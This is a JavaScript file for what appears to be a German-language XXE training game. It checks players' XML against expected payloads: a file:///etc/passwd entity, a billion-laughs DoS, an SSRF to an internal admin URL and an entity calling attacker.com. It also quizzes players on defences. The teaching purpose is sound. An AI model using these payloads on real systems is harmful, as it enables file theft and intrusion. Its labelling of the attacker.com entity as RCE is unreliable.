document.addEventListener('DOMContentLoaded', function () {
    // Funktion: Setup für die Tipps
    function setupTips() {
        document.querySelectorAll('[id^="tip"]').forEach(tipButton => {
            tipButton.addEventListener('click', function () {
                const tipId = `${tipButton.id}-box`;
                const tipBox = document.getElementById(tipId);
                if (tipBox) {
                    const isHidden = tipBox.style.display === 'none' || tipBox.style.display === '';
                    document.querySelectorAll('.tip-box').forEach(box => (box.style.display = 'none'));
                    tipBox.style.display = isHidden ? 'block' : 'none';
                }
            });
        });
    }

    // Funktion: Setup für jedes Level
    function setupLevel(level) {
        const result = document.getElementById(`resultLevel${level}`);
        const runAttackBtn = document.getElementById(`runAttackBtnLevel${level}`);

        if (level === 5) {
            // Spezifische Logik für Level 5
            const answer1 = document.getElementById('answer1');
            const answer2 = document.getElementById('answer2');
            const answer3 = document.getElementById('answer3');

            if (result && runAttackBtn && answer1 && answer2 && answer3) {
                runAttackBtn.addEventListener('click', function () {
                    const answers = [
                        answer1.value.trim().toLowerCase(),
                        answer2.value.trim().toLowerCase(),
                        answer3.value.trim().toLowerCase(),
                    ];

                    const validAnswers = [
                        "disable dtd", "disable external entities", "input validation", "secure parser", "use json"
                    ];

                    const matchedAnswers = answers.filter(answer => validAnswers.includes(answer));

                    if (matchedAnswers.length >= 3) {
                        result.textContent = "Sicherheitsmaßnahmen erfolgreich benannt!";
                        alert("Herzlichen Glückwunsch! Du hast Level 5 erfolgreich abgeschlossen.");
                    } else {
                        result.textContent = "Fehler: Mindestens drei korrekte Abwehrmethoden sind erforderlich.";
                    }
                });
            } else {
                console.error(`Fehlende DOM-Elemente für Level 5: answer1, answer2, answer3, result oder runAttackBtn.`);
            }
        } else {
            // Allgemeine Logik für Level 1-4
            const xmlInput = document.getElementById(`xmlInput${level}`);
            if (xmlInput && result && runAttackBtn) {
                runAttackBtn.addEventListener('click', function () {
                    const xmlData = xmlInput.value;

                    if (level === 1 && xmlData.includes("<!ENTITY ext SYSTEM \"file:///etc/passwd\">")) {
                        result.textContent = "Erfolgreicher Angriff: Datei /etc/passwd ausgelesen!";
                        alert("Herzlichen Glückwunsch! Du hast Level 1 erfolgreich abgeschlossen.");
                    } else if (level === 2 && xmlData.includes("<!ENTITY lol4")) {
                        result.textContent = "Erfolgreicher Angriff: DoS ausgelöst!";
                        alert("Herzlichen Glückwunsch! Du hast Level 2 erfolgreich abgeschlossen.");
                    } else if (level === 3 && xmlData.includes("<!ENTITY ssrf SYSTEM \"http://internal-system.local/admin\">")) {
                        result.textContent = "Erfolgreicher Angriff: SSRF durchgeführt!";
                        alert("Herzlichen Glückwunsch! Du hast Level 3 erfolgreich abgeschlossen.");
                    } else if (level === 4 && xmlData.includes("<!ENTITY test SYSTEM \"http://attacker.com/malicious_script.php\">")) {
                        result.textContent = "Erfolgreicher Angriff: RCE durchgeführt!";
                        alert("Herzlichen Glückwunsch! Du hast Level 4 erfolgreich abgeschlossen.");
                    } else {
                        result.textContent = "Fehler: Ungültiger XML-Code.";
                    }
                });
            } else {
                console.error(`Fehlende DOM-Elemente für Level ${level}: xmlInput, result oder runAttackBtn.`);
            }
        }
    }

    // Setup für Tipps und Level
    setupTips();
    const levelFromUrl = window.location.pathname.match(/level(\d+)\.html/);
    if (levelFromUrl) {
        const level = parseInt(levelFromUrl[1], 10);
        setupLevel(level);
    }
});
